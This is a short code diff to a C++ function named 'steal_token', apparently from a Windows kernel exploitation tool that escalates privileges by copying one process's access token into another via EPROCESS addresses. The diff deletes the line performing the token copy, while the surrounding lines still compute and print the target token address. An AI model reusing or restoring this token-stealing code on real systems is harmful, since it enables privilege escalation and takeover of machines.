@@ -444,7 +444,5 @@ bool vdm::steal_token(uint64_t victim_e_process, uint64_t target_e_process) {
     target_token_address = (uint64_t)target_process_token.Object & -0xF;
     std::cout << std::format("[*] New target token address: 0x{:X}", target_token_address) << std::endl;
 
-    target_process_token.Value = victim_process_token.Value;
-
     return true;
 }
